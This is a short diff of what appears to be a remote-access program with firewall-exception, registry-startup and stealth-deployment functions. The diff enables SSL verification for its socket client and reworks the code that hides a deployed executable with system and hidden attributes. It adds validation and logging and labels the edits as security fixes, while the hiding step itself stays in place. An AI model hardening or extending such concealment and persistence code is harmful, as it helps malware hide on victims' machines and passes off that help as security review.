@@ -644,7 +644,7 @@ def add_firewall_exception():
 # --- WebSocket Client ---
 if SOCKETIO_AVAILABLE:
     sio = socketio.Client(
-        ssl_verify=False,  # Disable SSL verification to prevent warnings
+        ssl_verify=True,  # Enable SSL verification for security
         engineio_logger=False,
         logger=False
     )
@@ -9382,10 +9382,20 @@ def add_registry_startup():
                 
                 # Set hidden and system attributes
                 try:
-                    subprocess.run(['attrib', '+s', '+h', stealth_exe_path], 
-                                 creationflags=subprocess.CREATE_NO_WINDOW, check=False)
-                except:
-                    pass
+                    # Validate and sanitize the file path to prevent command injection
+                    import os.path
+                    if os.path.exists(stealth_exe_path) and os.path.isfile(stealth_exe_path):
+                        # Use shell=False to prevent command injection and check return code
+                        result = subprocess.run(['attrib', '+s', '+h', stealth_exe_path], 
+                                               creationflags=subprocess.CREATE_NO_WINDOW, 
+                                               check=True, capture_output=True, text=True)
+                        log_message(f"[OK] File attributes set successfully")
+                    else:
+                        log_message(f"[WARNING] File path validation failed: {stealth_exe_path}")
+                except subprocess.CalledProcessError as e:
+                    log_message(f"[WARNING] Failed to set file attributes: {e}")
+                except Exception as e:
+                    log_message(f"[WARNING] Unexpected error setting attributes: {e}")
                     
             except Exception as deploy_error:
                 log_message(f"[ERROR] Failed to deploy to stealth location: {deploy_error}")
